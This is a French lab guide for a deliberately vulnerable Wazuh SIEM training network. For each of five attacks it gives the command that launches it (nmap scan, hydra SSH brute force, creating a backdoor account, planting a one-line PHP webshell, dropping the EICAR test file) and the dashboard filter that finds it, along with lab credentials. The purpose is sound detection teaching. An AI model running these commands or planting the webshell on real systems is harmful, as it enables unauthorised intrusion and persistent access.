# Scénarios d'attaque — lancer et retrouver dans Wazuh

Pour chaque attaque : **la commande pour la lancer** et **le filtre pour la retrouver** dans le
dashboard Wazuh. Chaque attaque vise un poste différent, donc elle apparaît sur l'agent
correspondant.

| # | Attaque | Cible | Agent Wazuh |
|---|---------|-------|-------------|
| 1 | Scan de ports | périmètre (203.0.113.1) | `router` (Suricata) |
| 2 | Brute force SSH | pc1 (SSH port 22) | `pc1` |
| 3 | Post-exploitation | pc1 | `pc1` |
| 4 | Scan web | pc2 (web port 80) | `pc2` |
| 5 | Dépôt de malware (EICAR) | pc3 (SSH port 2222) | `pc3` |

## Avant de commencer

Ouvre le dashboard sur **https://localhost:8443** → `admin` / `Passer123-` (accepte le certificat
autosigné). Les attaques se lancent depuis la machine attaquante :

```bash
vagrant ssh attacker
```

**Pour retrouver une attaque** : menu **☰** → **Threat Hunting** → onglet **Events**, règle la
période sur **Last 1 hour** (en haut à droite), colle le filtre dans la barre de recherche, puis
**Refresh**. Clique l'icône 🔍 sur une ligne pour voir le détail complet d'une alerte.

---

## 1. Scan de ports (reconnaissance)

**But** : l'attaquant cartographie les services exposés. Vu par Suricata sur le routeur.

**Lancer** :
```bash
sudo nmap -sS -sV -p 22,80,443,2222 203.0.113.1
```

**Retrouver dans Wazuh** :
```
agent.name:router and rule.groups:suricata and data.src_ip:203.0.113.66
```

**Ce que tu verras** : des alertes Suricata (`rule.id:86601`) et, pour le trafic bloqué, les
rejets du pare-feu. Le scan touche l'IP publique du routeur `203.0.113.1`.

---

## 2. Brute force SSH → pc1

**But** : deviner le mot de passe SSH par essais répétés. Il **réussit** (compte faible
`admin` / `admin123`).

**Lancer** :
```bash
hydra -l admin -P ~/wordlist.txt -t 4 -f ssh://203.0.113.1
```

**Retrouver dans Wazuh** :
```
agent.name:pc1 and rule.groups:authentication_failures
```
Et la **connexion réussie après les échecs** (preuve de compromission) :
```
agent.name:pc1 and rule.id:40112
```

**Ce que tu verras** : « sshd: brute force trying to get access to the system » (échecs répétés),
puis la règle **40112** « successful login after multiple failures ». Le détail d'une alerte
montre l'IP source `203.0.113.66` et le compte visé `admin`.

---

## 3. Post-exploitation → pc1

**But** : une fois entré, l'attaquant s'installe (escalade root, nouveau compte, webshell).

**Lancer** (après s'être connecté en SSH sur pc1) :
```bash
sshpass -p admin123 ssh -o StrictHostKeyChecking=no admin@203.0.113.1
# une fois sur pc1 (admin peut passer root — misconfig volontaire) :
sudo useradd -m -s /bin/bash backdoor
echo '<?php system($_GET[c]); ?>' | sudo tee /var/www/html/shell.php
```

**Retrouver dans Wazuh** :
```
agent.name:pc1 and (rule.id:5902 or rule.id:5402 or rule.id:554)
```

**Ce que tu verras** la **kill chain** sur pc1 :
- `rule.id:5402` — escalade : « Successful sudo to ROOT executed »
- `rule.id:5902` — persistance : « New user added to the system » (niveau 8)
- `rule.id:554` — dépôt du webshell : « File added to the system » (détecté par le FIM temps réel,
  `syscheck.path:/var/www/html/shell.php`)

---

## 4. Scan web → pc2

**But** : scanner un serveur web à la recherche de failles. Le port 80 est routé vers pc2.

**Lancer** :
```bash
nikto -h http://203.0.113.1 -maxtime 60s
```

**Retrouver dans Wazuh** :
```
agent.name:pc2 and rule.groups:web
```

**Ce que tu verras** : « Web server 400 error code » (`rule.id:31101`) et, quand les erreurs se
répètent depuis la même IP, « Multiple web server 400 error codes from same source ip »
(`rule.id:31151`, niveau 10).

---

## 5. Dépôt de malware (EICAR) → pc3

**But** : déposer un fichier malveillant sur un poste. On utilise **EICAR**, le fichier de test
antivirus standard (inoffensif). pc3 est exposé en SSH sur le port **2222**.

**Lancer** (après s'être connecté en SSH sur pc3) :
```bash
sshpass -p admin123 ssh -o StrictHostKeyChecking=no -p 2222 admin@203.0.113.1
# une fois sur pc3 :
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  | sudo tee /var/www/html/eicar.com
```

**Retrouver dans Wazuh** :
```
agent.name:pc3 and rule.id:554 and syscheck.path:*eicar*
```

**Ce que tu verras** : « File added to the system » (`rule.id:554`). Le détail montre
`decoder: syscheck_new_entry` et `full_log: File '/var/www/html/eicar.com' added — Mode: realtime`
— c'est la **surveillance d'intégrité (FIM) en temps réel** qui a capté le dépôt. Avec une clé API
VirusTotal (intégration Wazuh optionnelle), le hash serait en plus identifié comme malveillant.

---

## Tout voir d'un coup

Pour une vue d'ensemble de **toute** l'activité de l'attaquant (tous postes confondus), passe sur
l'onglet **Dashboard** avec le filtre :
```
data.srcip:203.0.113.66 or data.src_ip:203.0.113.66
```
Tu obtiens le total d'alertes, le graphe temporel et le classement **MITRE ATT&CK** des techniques
détectées.

## Tout rejouer automatiquement

```bash
tests/check.sh all
```
Lance les 5 scénarios et vérifie que chaque trace remonte bien dans Wazuh (45 contrôles).

---

➡️ Pour la version **avec captures d'écran du dashboard**, voir
[`scenario-demo-attaque.md`](scenario-demo-attaque.md).

*Infrastructure volontairement vulnérable, à usage pédagogique sur réseau isolé uniquement.*
